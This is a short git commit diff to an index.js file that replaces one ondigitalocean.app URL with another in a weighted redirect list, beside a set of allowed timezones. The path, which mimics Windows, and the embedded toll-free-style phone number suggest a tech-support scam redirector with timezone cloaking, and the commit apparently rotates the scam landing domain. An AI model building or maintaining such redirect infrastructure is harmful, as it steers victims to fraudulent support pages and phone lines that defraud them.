425378404806542881d370d097fc72862d6e5466
paalakash <palaksh452@gmail.com>
2026-06-06 12:09:33 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://lionfish-app-bce6d.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3990", weight: 1.0 }
+    { url: "https://plankton-app-6glyy.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3990", weight: 1.0 }
 
 ];
 
